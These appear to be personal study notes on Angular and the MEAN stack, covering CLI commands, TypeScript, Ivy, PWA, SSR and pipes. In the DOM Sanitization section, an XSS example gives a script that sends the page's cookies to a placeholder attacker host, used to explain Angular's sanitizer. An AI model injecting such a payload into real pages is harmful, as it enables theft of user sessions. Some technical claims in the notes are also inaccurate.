MEAN stack
MongoDB , Express , Angular , Node

MERN stack
MongoDB , Express , React , Node

FRONTEND CLIENT side FRAMEWORK(s) which use HTML, JS, TS, Dart for building application(s)
Angular , React
Angular works on REAL DOM.
React works on VIRTUAL DOM , better performance as compared to Angular.

BACKEND SERVER(s)
NodeJs , ExpressJs , ASP.NET , J2EE

Traditional Web Application  |  Single Page Application
                             -  Initial load (JS, CSS, HTML) on index.html (Single Page)
                             -  Initally slow on index.html but subsequent requests are faster
                             -  Client - Browser loads/remove/modify DOM coz they have ANGULAR/REACT libs
Check reference screenshots too.


Why TypeScript ?
=================
1. It provides intent of code and increases readibility. eg: function sum(a: number, b: number): number { return a+b; }
2. Errors related to typeof args, return type can be detected at compile time, which otherwise would be possible at runtime only.
3. Auto suggestions while writing TS code is provided by most tools (VScode).
4. No need to write unit test cases related to type of args, return type.


Angular Versioning
================================
AngularJs   --->   Angular 1.x
Angular     --->   Angular 2 onwards
Angular uses SEMVER (SEMANTIC VERSIONING) ie adding meaning to VERSION.
eg: 2.5.8
    2 --> Major Version   (Breaking Change , ie there is need to modify existing code , eg: AngularJS to Angular)
    5 --> New Feature     (not breaking)
    8 --> Patch, bugfixes (not breaking)

Angular 3 does not exist
Reason : angular/router module in core library of Angular was at v3.x.x plus ahead of v2.x.x for other modules.
         Now if Angular v3 is released , angular/router module will be at v4.x.x while others will be at v3.x.x
         So to avoid cofusion it was dropped and moved to v4 directly.
Every six months , one major release is made to Angular Version.


METADATA
===============
Tells angular how to process a class ie qualifying a class with the attributes which angular framework can understand.
Consists of decorators. Eg: @Component, @Injectable, @NgModule, @Pipe.
NOTE : a class immediately succeeded by METADATA decorator will only act as ANGULAR specific.

Transpiler is used to convert TS to JS.
This is done either by browser or before providng production build to browser for faster response.


NPM
================
NPM is a NODE PACKAGE MANAGER which gets installed with nodeJS   just  as  MAVEN, ANT, GRADLE  etc...
NPM is used to install a package, and any packages that it depends on.
> npm install
If the package has a 'package-lock' or 'shrinkwrap file', installation of dependencies will be driven by that else from 'package.json'

> npm install --save <PACKAGE_NAME>
Install the dependencies in the local node_modules folder.

> npm install -g --save <PACKAGE_NAME>
(--global), installs the current package context (ie, the current working directory) as a global package in NodeJS's 'node_modules' dir

> npm update --save
> npm update -g --save
npm checks if there exist newer versions in repository that satisfy specified semantic versioning ranges as in package.json and installs them.
If no package name is specified, all packages in the specified location (global or local) will be updated.

> npm outdated
> npm install <PACKAGE_NAME>@latest --save
Updating a version that is beyond semantic versioning range requires two parts. 
First, you ask npm to list which packages have newer versions available using `npm outdated`.
Then you ask npm to install the latest (@latest) version or specific version (@4.1.6) of a package.

> npm config set registry <NPM_REPO_URL>
Set base url for npm package registry i.e. repo to download packages , Default is https://registry.npmjs.org/

> npm config set proxy <PROXY_URL>
> npm config set https-proxy <PROXY_URL>
Set proxy for a network to allow download of packages

> npm config delete <KEY>
Delete a config setting <KEY> , it can be `proxy`, `https-proxy`    etc...


SETUP
================
Refer  SetupInstructions.docx  document

node.js terminal is a CMD terminal with NODEJs and NPM path variables set for user automatically.

(MULTI-REPO)  :  every new angular project created will have its own node_modules, files (angular.json, package.json), folders.
> ng new <APP_NAME> 
> ng serve
> ng build --prod
  ng build --prod --output-hashing=none           // prevents hash-number to be attached to build artifacts

(MONO-REPO)   :  only one node_modules and common files which can be shared by all angular applications inside working directory <my-workspace>
> ng new <my-workspace> --create-application=false --defaults
> ng generate application <my-app>
> ng serve <my-app>
> ng build <my-app> --prod  
--create-application : tells the Angular CLI not to generate an initial application.
--defaults           : tells the Angular CLI not to prompt you about routing and CSS preprocessor.
NOTE : application <my-app> and its corresponding <my-app>-e2e application are in the 'projects' folder.
     : ng s <my-app> [options]    or    ng serve <my-app> [options]           will start the application

> ng update
Perform a basic update to the current stable release of application and its dependencies.
If no package name and option is specified , it will merely check updates available.
--all=true | flase   ,  Whether to update all packages in package.json. (default=false)
NOTE : Its always advisable to update your app to its next major version i.e. Migrating from angular v6 to v7, then to v8, then to v9, then to v10 and so on..
     : > ng update @angular/core@8 @angular/cli@8     |    ng update @angular/core @angular/cli
     : > ng update @angular/material
     : > ...and many more as desired or required...
Refer : https://update.angular.io/

> ng serve [options]
Reference : https://github.com/angular/angular-cli/wiki/serve
--port portval     :  Port to listen on
--host hostval     :  Host to listen on
--open (alias: -o) : Opens the url in default browser
--progress         : Log progress to the console while building.
--optimization     : Enables optimization of the build output.   ..... etc.. more on above link

> ng add <package>                                (MULTI-REPO)
> ng add <package> --project <my-app>             (MONO-REPO)
ng add makes adding new capabilities to your project easy. ng add will use your package manager to download new dependencies and 
invoke an installation script (implemented as a schematic) which can update your project with configuration changes, 
add additional dependencies (e.g. polyfills), or scaffold package-specific initialization code

"npm start"   command will work same as   "ng serve"    command.
because the "start" key of package.json is having value "ng serve -o".


IVY ENGINE
=============
Ivy is the code name for Angular's next-generation compilation and rendering pipeline.
Prior to angular v9 , IVY features were in beta and can be used for experimental purposes.
With the version 9 release of Angular, the new compiler and runtime instructions are used by default instead of the older compiler and runtime, known as View Engine.
This can be checked in `tsconfig.app.json` under  "angularCompilerOptions": {  "enableIvy": true }

AOT compilation with Ivy is faster and should be used by default.
In the `angular.json` workspace configuration file, set the default build options for your project to always use AOT compilation.

View Engine v/s Ivy Engine
Template HTML that we’ve written runs through the Angular compiler and generates highly optimised JS code that represents the structure of your template. 
At runtime, this data structure is passed to the Angular interpreter, which uses the data to determine how to create the DOM.
VIEW ENGINE : Template HTML -> Template data -> Angular Interpreter -> DOM

Instead of generating template data and passing it into interpreter that then makes decisions on which operations to run ,we generate a set of template instructions directly.
These instructions will do work of creating correct DOM on their own. So we no longer need interpreter that will check whether every operation is needed.
IVY ENGINE : Template HTML -> Template instructions -> DOM


DOM Sanitization
=========================
Cross-site Scripting or XSS is probably the most common website security vulnerability. 
It enables an attacker to inject client-side script into web pages viewed by other users.
Example :
  a. Every blog on the Internet has a comment’s system that allows users to comment on articles.
     suppose that an attacker sends the following code as a “comment” to the server
        <script>
 	   window.location=’http://attacker/?cookie='+document.cookie
	</script>
     If the website does not protect itself from Cross-site Scripting, this content will be saved to the database and 
     all users visiting the page will redirect to the attacker URL.
  b. Bind the src property of an Iframe (or a video)
How Angular 2 protect us from XSS:
  Angular treats all values as untrusted by default. 
  When a value is inserted into the DOM from a template, via property, attribute, style, class binding, or interpolation, 
  Angular sanitizes and escapes untrusted values.
  Behind the scenes, Angular will sanitize the HTML input and escape the unsafe code.
  i.e. The script will not run, only display on the screen as text.
       Angular throwing error "unsafe value used in a resource URL context" because the <iframe src> attribute is a resource URL security context.
Bypass Angular protection:
  use the DomSanitizer service
  - .sanitize(SecurityContext, value) | SecurityContext = SecurityContext.NONE, SecurityContext.HTML, SecurityContext.STYLE, SecurityContext.SCRIPT, SecurityContext.URL, SecurityContext.RESOURCE_URL
  - .bypassSecurityTrustHtml(value)
  - .bypassSecurityTrustStyle(value)
  - .bypassSecurityTrustScript(value)
  - .bypassSecurityTrustUrl(value)
  - .bypassSecurityTrustResourceUrl(value)
  import {BrowserModule, DomSanitizer} from '@angular/platform-browser';
  a. export class App {
      constructor(private sanitizer: DomSanitizer) {
       this.html = sanitizer.bypassSecurityTrustHtml('<h1>DomSanitizer</h1><script>ourSafeCode()</script>') ;
      }
     }
  b. export class App {
      constructor(private sanitizer: DomSanitizer) {
       this.iframe = sanitizer.bypassSecurityTrustResourceUrl("https://www.google.com")
      }
     }
     
     
`const` in Angular and Typescript
===================================
`const` keyword will not work and gives compilation error `A class member cannot have the ‘const’ keyword`
Because class members are mutable and modified and accessed by different calls and objects.
Typescript thus provides readonly modifier field instead of const. const is for variables and readonly is for class properties.
In both cases reassignment is NOT possible, however value can change. Eg: const a=[9025,4021];
Example: readonly instanceVariable = "instanceData";                      a=[9025]; // INVALID | a[0]=4084; // VALID


Global window var | Ambient var in Typescript
==============================================
- Adding new global properties to Window object
  Create global object outside class/component in .TS file
  These variables can then be used anywhere in our .TS file using,  window.VAR
  Eg: declare global {
        interface Window {
          fullName?: string;
          emailId?: string;
        }
      }
- Ambient variable declarations
  If we are using a lib that adds global variables and we need to assign something to it in .TS file
  We need to inform compiler about their existence. Declare them outside class/component in .TS file
  And then these can be assigned using,  window['dataLayer'] = window['dataLayer'] || [];  dataLayer.push({});
  Eg: declare var dataLayer: any;


Angular 10, new stuff
=========================
1. Allows use of --strict flag while creating a new project
   It provides reduced budget sizes that can be checked in `angular.json`
   Removes support for 'any' data type of variables that can be checked in `tslint.json` under key 'no-any' : true
   > ng new --strict <PROJECT_NAME>
   
2. Reduced bundle size of production build artifacts
   Angular 10 will only support ES6 (ES2015) and above modules due to which it will not work on older browsers IE 9, 10, 11.
   As a result production build artifacts generated using `ng build --prod` will only have es2015 compatible artifacts, whereas in prior versions it has both es5 and es2015 build artifacts.
   This can be configured in '.browserslistrc' file.
   > npx browserslist           /* This will give a list of all supported browsers for application */
   
3. &nbsp; &lt; and other markups will no longer be supported by Angular 10 as it is always discouraged by HTML 5.
   Instead we must use CSS properties padding , margin etc. for spacing.
 
NOTE : We may use Angular 9 if we need to support old browsers or Angular 10 for better performance, reduced bundle size.



PWA experience to Angular
===============================
Following package will add all necessary code for making an app a PWA, which otherwise had to be done manually.
It will update angular.json, package.json, app.module.ts, index.html plus create assets/ dir for relevant icons.
> ng add @angular/pwa                             (MULTI-REPO)
> ng add @angular/pwa --project <my-app>          (MONO-REPO)

@angular/pwa package provides offline functionalities to our app by making use of service workers. This can be configured in `ngsw-config.json` file.
A) "assetGroups": [                                 /** Caching static resources or assets i.e. resources loaded from page's origin, CDNs */
   	{
		"name": "app",
		"installMode": "prefetch",          /** prefetch(default): fetch every listed resources | lazy: cache only which are requested from listed resources */
		"resources": {
			"files": ['/**/*.css', '/*.js'],
			"urls": ['GOOGLE-FONTs-CDN']
		}
	},
	{
		"name": "assets",
		"installMode": "lazy",
		"updateMode": "prefetch",           /** Defaults to value of installMode. Determines caching behavior when new version of app is discovered.
		                                        prefetch: download/cache changed resources immediately.
							lazy: not cache resources. Instead, treats them unrequested, waits until they're requested again before updating them. 
							      NOTE : An updateMode of lazy is only valid if the installMode is also lazy. */
		"resources": {
			"files": ['/assets/**']
		}
	}
   ]
B) "dataGroups": [                                  /** Caching dynamic data from NETWORK API requests */
	{
		"name": "myDATA",
		"urls": ['API-REQ-URLs'],
		"cacheConfig": {
			"maxSize": 5,               /** maximum number of entries, or responses, in the cache. Eg: 5:last five entries in 'urls' array */
			"maxAge": "3d12h",          /** how long responses are allowed to remain in the cache before being considered invalid and evicted */
			"timeout": "5s30u",         /** how long the Angular service worker will wait for the network to respond before using a cached response */
			"strategy": "freshness"     /** performance(default): depend on `maxAge`, If resource exists in cache use it and no network request is made */
			                                freshness: depend on `timeout`, fetch data from network request. Only if network times out, use cache
							NOTE : To simulate 'staleWhileRevalidate' strategy, set `strategy` to 'freshness' and `timeout` to '0u'
		}
	}
   ]


Angular Material
================================
REFER : https://material.angular.io/components/categories
UI can be improved by using either Bootstrap or Angular Material.
Angular material provides functionality for PAGINATION OF TABLES, SORTING OF TABLES via column clicks ... and much more.
NOTE : @angular/material package has to be added, which will update angular.json, package.json, app.module.ts  .... etc.
> ng add @angular/material                        (MULTI-REPO)
> ng add @angular/material --project <my-app>     (MONO-REPO)

NOTE : material to be used must be imported in imports [] of '.module.ts'



Angular Elements or Web Components
======================================
By using Angular Elements you can package Angular components as custom elements, a web standard for defining new HTML elements in a framework-agnostic way.
The custom elements standard is currently supported by browsers like Chrome, Opera, and Safari. To be able to use it Firefox and Edge polyfills are available. 

With a custom element you can extend the set of available HTML tags. The content of this tag is then controlled by JavaScript code which is included in the page.
In order to keep track of all available custom elements the browser maintains a registry in which every elements needs to be registered first. 
In this registry the name of the tag is mapped to the JavaScript class which controls the behavior and the output of that element.

The Angular Elements functionality is available with the package @angular/elements. 
This packages exposes the createCustomElement() function which can be used to create a custom element (web component) from an Angular component class. 
Therewith it provides a bridge from Angular component interface and change detection functionality to the build-in DOM API.
It will add the needed document-register-element.js polyfill and dependencies for Angular Elements at the same time.
> ng add @angular/elements

In app.module.TS (root module)
1. Import Injector from the @angular/core package and createCustomElement from the @angular/elements package
// example
   import { NgModule, Injector } from '@angular/core';
   import { createCustomElement } from '@angular/elements';
    
2. <COMPONENT> desired to be angular element will not be used in Angular application itself, so we need to add it to entryComponents property to @NgModule decorator.
// example
   entryComponents: [
     <COMPONENT>
   ]
   
3. Using createCustomElement() function , register newly created custom element in browser that return reference to CustomElementRegistry object
// example
   export class AppModule { 
     constructor(private injector: Injector) {}
     ngDoBootstrap() {
        const el = createCustomElement(<COMPONENT>, { injector: this.injector });
        customElements.define('custom-element-tag', el);
     }
   }
   
4. Build process
   a. generate files under `/dist` without hash values appended to file names
      > ng build --prod --output-hashing none
   b. bundle runtime,polyfills,main,script JS files into single file that is used for src of <script> , fs-extra: provides file system methods , concat: concatenate multiple files
      > npm install fs-extra concat
   c. create a bundle-js.js script
         const fs = require('fs-extra');
         const concat = require('concat');
         (async function build() {
          const filesES2015 = [
           './dist/spaceXLaunchPrograms/browser/runtime-es2015.js',
           './dist/spaceXLaunchPrograms/browser/polyfills-es2015.js',
           './dist/spaceXLaunchPrograms/browser/scripts.js',
           './dist/spaceXLaunchPrograms/browser/main-es2015.js'
          ];
          const filesES5 = [
           './dist/spaceXLaunchPrograms/browser/runtime-es5.js',
           './dist/spaceXLaunchPrograms/browser/polyfills-es5.js',
           './dist/spaceXLaunchPrograms/browser/scripts.js',
           './dist/spaceXLaunchPrograms/browser/main-es5.js'
          ];

          await fs.ensureDir('app-element');

          await concat(filesES2015, 'app-element/spaceXApp-es2015.js');
          await concat(filesES5, 'app-element/spaceXApp-es5.js');

          await fs.copyFile('./dist/spaceXLaunchPrograms/browser/styles.css', 'app-element/styles.css');
          await fs.copyFile('./dist/spaceXLaunchPrograms/browser/manifest.webmanifest', 'app-element/manifest.webmanifest');
          await fs.copyFile('./dist/spaceXLaunchPrograms/browser/ngsw-worker.js', 'app-element/ngsw-worker.js');
          await fs.copyFile('./dist/spaceXLaunchPrograms/browser/ngsw.json', 'app-element/ngsw.json');
          await fs.copyFile('./dist/spaceXLaunchPrograms/browser/safety-worker.js', 'app-element/safety-worker.js');
          await fs.copyFile('./dist/spaceXLaunchPrograms/browser/worker-basic.min.js', 'app-element/worker-basic.min.js');
    
          await fs.copy('./dist/spaceXLaunchPrograms/browser/assets/', 'app-element/assets/' );
    
         })();
	 
   d. run above bundle script that will create app-element dir with all necessary files copied from /dist dir
      > node bundle-js.js
      
   e. create index.html in this newly created dir and serve this index.html with http-server tool using command `http-server` at this dir
      <!DOCTYPE html>
      <html lang="en">
      <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Test Angular Elements</title>
      <link rel="stylesheet" href="styles.css">
      </head>
      <body>
        <app-element></app-element>
        <script src="spaceXApp-es5.js" defer></script>
        <script src="spaceXApp-es2015.js" async></script>
      </body>
      </html>
 


Angular SSR (Server Side Rendering) and Pre-rendering/SSG(Static Site Generation) with Angular Universal
===============================================================================
Angular applications are single-paged apps (SPAs) - this means a single HTML document is served to the client, 
which can then be dynamically rewritten on the client browser-based on data received from the server, instead of serving a static page when routing. 

Angular Universal allows the app to be executed on the server, which lets us generate and serve static HTML to the client in response to navigation. 
This means that when user opens Angular app, server will show user a pre-rendered version of app which they can browse while client-side application loads behind-the-scenes. 
When the client-side application has finished loading, the application switches from pre-rendered app to the fully interactive client-side app, without the user even noticing.

CSR vs SSR vs SSG
- CSR allows having highly user interactive websites.
  However, it might result in delayed FCP due to large bundle size of JS. Also, there is problem with SEO.
- Dynamic SSR or SSR is when there will be live Node server spun up such that whenever Route is hit, it will dynamically generate and serialize application — returning that String to browser.
  Static Pre-rendering or pre-rendering is when we want to pre-render a list of routes and create static files, (ie: index.html, about-us.html, etc) and then use server of our choice to serve up those files later on.
- SSR is used when application (and the routes you need to SSR) are dynamic i.e. application structure is rendered based on JSON files where anything could change at any given moment.
  Pre-rendering is used when application (or at least the Routes you’re trying to pre-render) are a static content eg: about us, contact us. 
  dynamic content routes can be pointed to normal CSR version of your application.
- SSR is rendering client-side app to HTML on the server i.e. server compiles application(render on a server) and sends generated HTML page back to client.
  Prerendering is running client-side app at build time to capture its initial state as static HTML and saved as static HTML pages on file-system and sends same when requested.
  In both rendering technique, we generate static HTML pages. Just the major difference is the location where HTML pages are generated.
- CHECK SCREENSHOTS TOO.

The Angular CLI compiles and bundles the Universal version of the app with the Ahead-of-Time (AOT) compiler. 
Install the Angular Universal schematic to set our app up for server-side rendering and pre-rendering.
> ng add @nguniversal/express-engine
OR update
> ng update @nguniversal/express-engine

This will create following new files:
- main.server.ts             * bootstrapper for server app
- server.ts                  * express web server
- app/app.server.module.ts   * server-side application module

A sample code for estimating FCP time, write in index.html of your app
<script>
    const po = new PerformanceObserver((list) => {
      for (const entry of list.getEntriesByName('first-contentful-paint')) {
        console.log('FCP: ', entry.startTime);
        po.disconnect();
      }
    });
    po.observe({type: 'paint', buffered: true});
</script>

- client-side rendered (CSR) version of our app is served using
  // PRODUCTION MODE
  > ng build --prod --output-hashing=none
  Deploy files under `dist/<project-name>/browser` to a server
  // DEVELOPMENT MODE
  > npm run start         OR       > ng serve
  The CSR app in development mode is available on port 4200 (default), which can be changed in `package.json` file.

- server-side rendered (SSR) version of our app is served using
  > npm run build:ssr && npm run serve:ssr
  These run script configuartions are available in package.json
  The SSR app is available on port 4000 (default), which can be changed in the generated `server.ts` file.

  To run SSR app in development mode, that will automatically recompile the client and server bundles and live-reload the browser.
  > npm run dev:ssr
  
- SSG/pre-rendered version of our app
  Pages that don’t need to be rendered server-side or rendered on the client every time a user makes a request. 
  Angular Universal 9 now allows you to cache these pages as static files, which can then be served to the client via your CDN or a simple server.
  Set up
  1- pre-rendered files are found at `dist/<project-name>/browser` after running following command
     > npm run prerender
     This will look for all static routes using guess-parser and prerender it. Prerendering also renders the data received from API response.
     Guess-parser is able to detect static routes, but it is unable to detect parameterized routes, so use following step.
  2- In `angular.json` file and look for the "prerender" builder (at the very end of the default angular.json). 
     The builder comes with a "routes": [], which allows to specify the routes of the app pages we wish to pre-render.
     OR specify a .txt file with each route on new line and replace "routes" key with "routesFile": "./pre-render-routes-file.txt"
  3- Deploy files in `dist/<project-name>/browser` to a server to serve pre-rendered version of app.

There are three main reasons to create a Universal version of your app:
- Facilitate web crawlers through search engine optimization (SEO)
  Angular Universal can generate a static version of your app that is easily searchable, linkable, shareable and navigable without JavaScript. 
  Universal also makes a site preview available since each URL returns a fully rendered page.
  This is evident as client-side application shows <app-root></app-root> with nothing else inside it, 
  whereas server-side app displays page CSS and all app content coming from <app-root></app-root>. This makes it much easier for a web-crawler to scrape app’s content.
- Improve performance on mobile and low-powered devices
  Some devices don't support JavaScript or execute JavaScript so poorly that the user experience is unacceptable. 
  For these cases, you may require a server-rendered, no-JavaScript version of the app. 
- Show the first page quickly with a first-contentful paint (FCP)
  With Angular Universal, you can generate landing pages for the app that look like the complete app. 
  The pages are pure HTML, and can display even if JavaScript is disabled. It will serve a static version of the landing page to hold the user's attention. 
  At same time, you'll load full Angular app behind it. User perceives near-instant performance from landing page and gets full interactive experience after full app loads. 



Make Angular application compatible with Internet Explorer (IE)
=================================================================
REFERENCE : https://indepth.dev/angular-internet-explorer/
FOR PRODUCTION BUILD   (ng build --prod)
------------------------------------------
1. Install a couple of npm packages
>  npm install --save classlist.js
>  npm install --save web-animations-js

2. Edit `polyfills.ts`
-  uncomment two commented out lines in   `APP_NAME\\src\\polyfills.ts`
   import 'classlist.js';
   import 'web-animations-js';
   
3. Edit `browserslist`
-  remove not from   not IE 9-11   line in   `APP_NAME\\browserslist`
   IE 9-11
   
FOR DEVELOPMENT   (ng serve)
------------------------------
1. Edit tsconfig.json
-  change "target": "es2015"  to  "target": "es5"  in  `APP_NAME\\tsconfig.json`
   "compilerOptions": {
   	"target": "es5"
   }



jQuery / Bootstrap in Angular
================================
> npm install jquery                                    // Install jQuery plugin
> npm install bootstrap                                 // Install Bootstrap plugin

NOTE : After installing jQuery or bootstrap we need to make it global. 
       In the module (inside node_modules), .min.js under ‘dist’ folder is not public.
       To make them global, add .min.js 
        - inside "angular-cli.json" or "angular.json"  add the path "node_modules/jquery/dist/jquery.min.js" in scripts: [] property
        - i.e.   "scripts" :[
                   "node_modules/jquery/dist/jquery.min.js",
                   "node_modules/bootstrap/dist/js/bootstrap.min.js"
                 ]
       Similarly we can add .min.css
        - inside "angular-cli.json" or "angular.json"  add the path "node_modules/jquery/dist/jquery.min.css" in styles: [] property
        - i.e.   "styles" :[
                   "node_modules/@angular/material/prebuilt-themes/indigo-pink.css",
                   "node_modules/bootstrap/dist/css/bootstrap.min.css",
                   "src/styles.css"
                 ]
        
To use jQuery inside a component
        - import * as $ from 'jquery'
        
Also now we can use Bootstrap as usual with class names in our CSS files.



INTERNATIONALIZATION (i18n) | LOCALIZATION (l10n)
=====================================================
REFER : https://angular.io/guide/i18n



JIT / AOT
===================
- In the beginning, a compiler was responsible for turning a high-level language into object code (machine instructions), 
  which would then be linked into an executable.
  
- just-in-time (JIT) compilation (also dynamic translation or run-time compilations) is a way of executing computer code 
  that involves  compilation during execution of a program — at run time — rather than prior to execution.
  Or stated more simply, it is that the code gets compiled when it is needed, not before runtime.
  
  A just-in-time (JIT) compiler is a feature of the run-time interpreter, that instead of interpreting bytecode every time a method is invoked, 
  will compile the bytecode into the machine code instructions of the running machine, and then invoke this object code instead.
  
  In JIT, not all the code is converted into machine code initially. Only code that is necessary (used immediately) will be converted into machine code. 
  Then if a method or functionality called and is not in machine code, then that will also be turned into machine code. 
  This reduces the burden on the CPU and makes the app render faster because it only uses what is needed.
  
- ahead-of-time compilation (AOT compilation) is the act of compiling a higher-level programming language such as C or C++, or an 
  intermediate representation such as Java bytecode or .NET Framework Common Intermediate Language (CIL) code, 
  into a native (system-dependent) machine code so that the resulting binary file can execute natively.
  
  An ahead-of-time (AOT) compiler converts your code during the build time before the browser downloads and runs that code. 
  Compiling your application during the build process provides a faster rendering in the browser.
  
  Benefits
  Faster rendering, Fewer asynchronous requests, Smaller Angular framework download size, Detect template errors earlier, Better security
  
- JIT compilation is the default when you run the `ng build` or `ng serve` CLI commands. This is for development.
  For AOT compilation, include the `--prod` or `--aot` option with the `ng build` or `ng serve` command, 
  NOTE : this parameter is configured in 'angular.json' with `AOT`.



Structure of Angular Application
==========================================
e2e               : end to end tests
node_modules      : contains node nodules used by angular application (MULTI-REPO) or provides packages to your workspace (MONO-REPO).
src/app           : contains components (.html, .ts, .css, -spec.ts)
src/polyfills     : compatibility for different browsers.
src/styles.css    : define styling classes which can be used by all components in app, like defining global styles.
src/index.html    : the starting point, the page which browser reads and loads when running angular app. (contains <selector></selector> for bootstrap component)
src/main.ts       :	the entry point from a code perpective for your angular app. (contains  platformBrowserDynamic().bootstrapModule(AppModule))
angular.json      : CLI configuration defaults
tsconfig.json     : typescript configuration
package.json      : configures the npm package dependencies ie which libraries will be installed into node_modules plus script rules.
                    ~version : “Approximately equivalent to version”
                    ^version : “Compatible with version”
package-lock.json : a derivative of package.json which has exact library version(s) you are using for this app.
                    `npm install` uses 'package-lock.json' (if available) else 'package.json' to install required dependencies.
                    


commands will look for  "package.json"  file  which contain dependencies  and then load   "index.html"   file
index.html     loads   main.ts   loads   app.module.ts   .... so on as below

index.html                --   defines the tag to be filled by BOOTSTRAPED ANGULAR component as defined in main.ts
                               eg:- <app-root> DEFAULT text to be diplayed if ANGULAR component not found </app-root>

main.ts                   --   defines AppModule (app.module file) in the bootstrapModule() 

app.module.ts             --   defines @NgModule
                               --   defines AppComponent (app.component file) ie register all components/modules here
                               --   new components are declared in "declarations" and "imported" , 
                                    provided they are EXPORTED in their respective ".component.ts" file
NOTE : For a NEW COMPONENT
mkdir component_dir under app dir (default) component  OR  give path to COMPONENT_NAME
      mk    comp.component.ts     file
      mk    comp.component.html   file
      manually declare new component in app.module.ts "declarations"
      ------OR------
      > ng generate component DIR/COMPONENT_NAME/            // this will create a COMPONENT_NAME dir under DIR dir with required files .html, .ts, .css
      > ng g c DIR/COMPONENT_NAME/
      automatically updates app.module.ts declare new component in "declarations"

app.component.ts          --   defines @Component
                               --   defines the name of selector tag to insert ANGULAR component in any .html
                                    NOTE : This <selector_name></> tag must be written in .html file of that COMPONENT in whose MODULE.ts it is REGISTERED
                               --   defines TEMPLATE file to be displayed to BROWSER
                               --   defines css file
                          --   This class must be EXPORTED for ".module.ts" file to be able to IMPORT and REGISTER it
                          --   defines variables of class AppComponent to be supplied to its respective TEMPLATE file (.html)

                                -- Done using INTERPOLATION ie using  {{ var }} in .HTML values are supplied dynamically
                                                                      {{'Title : '  + var}}          // hardcoded_str + var
                                                                      {{'Title : '  + funccall()}}   //               + function_call()
                                                                      {{mathematical_expressions}}   // eg:- 2*5+6
                                                                      src={{ var }}                  // attribute values

                                --   NOTE : INTERPOLATION is only for STRINGs , for integer , boolean..use 
                                     PROPERTY BINDING                 [disabled] = 'var'                       // NOTE : use of [] for attrib and ' ' for vals
                                     CSS_CLASS BINDING                [class.CLASS_NAME_CSS] = "BooleanVAR_EXPRESSION"
                                                                      [ngClass] = "'firstCSSClass secondCSSClass'"                 // NOTE : use of '' over class names
                                                                      [ngClass] = "['firstCSSClass' , 'secondCSSClass']"
                                                                      [ngClass] = "{'firstCSSClass' : i%2==0 , 'secondCSSClass' : i%2==1}"
								      [ngValue] = "option"                     // [value] is string, whereas with [ngValue] object can be passed

                                --   EVENT BINDING                    (click)    = 'funccall()'                // NOTE : use of () for event  and ' ' for func
                                                                      (input)    = 'func($event.target.value)' //        send data from DOM to component
                                --   TWO-WAY DATA BINDING
                                     NOTE : Import { FormsModule } in "app.module.ts"    and   include  in  "imports" for two-way
                                     -- No processing..               [(ngModel)]     = "var"                 // set value attribute's val of tag as var from DOM to COMPONENT and vice versa
                                     -- Processing..                  (ngModelChange) = "func($event)"        // pass value to component , later used by [ngModel]
                                                                      [ngModel]       = "var"                 // pass to DOM after processing

app.component.html        --   displayed to BROWSER



Misc. Event binding example (similar to `this` in JS)
=============================
In '.comp.html'
- <input matInput type="text" (keyup)="applyFilter($event)" placeholder="search">

In '.comp.ts'
-  applyFilter(event: Event) {
    const filterValue = (event.target as HTMLInputElement).value;
    this.products.filter = filterValue.trim().toLowerCase();
   }

     
     
PIPES
==================
                          --   BUILTIN PIPES    
                              ----------------  eg:- {{ var | uppercase }}
                                                     {{ var | lowercase }}
                                                     {{ var | titlecase }}
                                                     {{ var | date : "dd/mm/yyyy" }}               // var = new Date();
                                                     {{ var | date : "shortTime" }}
                                                     {{ var | currency : 'EUR' : true }}           // show euro symbol
                                                     {{ var | currency : 'EUR' : false }}          // donot show euro symbol , shows EUR
                                                     {{ var | json }}                              // converts JS object to JSON {"" : ""}
                                                     {{ var | percent }}                           // var = 00.54534 , output = 55%
                                                     {{ var | slice : <start> : <end> }}           // var = ARRAY , [start_index,end_index)
                                                     {{ var | number : '<minDigitsBeforeDecimal>.<minDigitsAfterDecimal>-<maxDigitsAfterDecimal>' }}
                                                     
                          --   CUSTOM PIPES
                              ----------------
NOTE : For creating NEW PIPE
      manually
      ----- OR -----
    > ng generate pipe PIPENAME
                               -- CREATE a "PIPENAME.pipe.ts" under it's component dir , use @Pipe and implement PipeTransform with pipeClass , export this class
                               -- pipeClass implements PipeTransform interface's transform method that accepts input value followed by parameters and returns transformed value.
                               -- multiple args can be passed to transform function using (colon) '' : '' : ''
                               -- Import and include it in  "declarations"  of  "app.module.ts"
                               -- Use    [(ngModel)] = "filtervar"    in   <input>  tag.
                               -- Use in TEMPLATE .html with directives using pipe_symbol (|) PIPENAME : filtervar
                               -- Example : {{ var | CUSTOM_PIPE : <arg1> : <arg2> | uppercase }}
                               
                           --  PURE / IMPURE PIPES
                              -----------------------
                               -- Pure
                                  - This is DEFAULT pipe , if 'pure' metadata is not specified in @Pipe decorator({})
                                  - BUILTIN pipes are PURE.
                                  - input parameters value determine the output , if input parameters don’t change , output doesn’t change
                                  - can be shared across many usages without affecting the output result
                                  - there’s no internal state , Even though there are two usages in the example template , 
                                    Angular can create only one pipe instance which can be shared between the usages.
                                    
                               -- Impure
                                  - cannot use the input value to determine if the output will change
                                  - cannot be shared because the internal state can be affected from outside
                                  - the same parameters do not guarantee that same output , 
                                    It means that Angular is forced to trigger transform function on a pipe instance on every digest (change detection cycle)
                                    <span>{{v1 | customPipe}}</span>
                                    <span>{{v2 | customPipe}}</span>
                                  - example
                                    @Pipe({
                                      name: 'customPipe', 
                                      pure: true               // pipe is NOT(default) re-calculated on every change of data. once pipe applied, it needs to re-trigger, say
                                    })                         // we need to type in again in filter input, to show data changes that too matches with filter text.
                                    
                                  - example
                                    @Pipe({
                                      name: 'customPipe',
                                      pure: false              // pipe is re-calculated on every data change, i.e. say we have a filter pipe and we input data
                                    })                         // in field to filter, but then a data change happens, matching filter text, so this will show that new data too.
                                    
                                  -- Async pipe
                                  - It is an example of impure pipe , 
                                    This pipe has internal state that holds an underlying subscription created by subscribing to the observable passed to the pipe as a parameter
                                  - Because of that Angular has to create a new instance for each pipe usage to prevent different observables affecting each other. 
                                    And also has to call transform method on each digest 
                                    because even thought the observable parameter may not change the new value may arrive through this observable that needs to be processed by change detection.
                                  - However async pipe unsubscribes itself from observables on 'ngOnDestroy()'
                                    
<ng-template>, <ng-container> and <ng-content>
================================================
- <ng-template></ng-template>
  It allows us to conditionally render content using template reference variables(#TEMPLATE-REF-VAR) and structural directives(*ngIf)
- <ng-container></ng-container>
  It allows not to have an extra <div> on DOM.
  eg: We cannot use two structural directives on one <div>, therefore we can make use of <ng-container> for one and <div> for another.
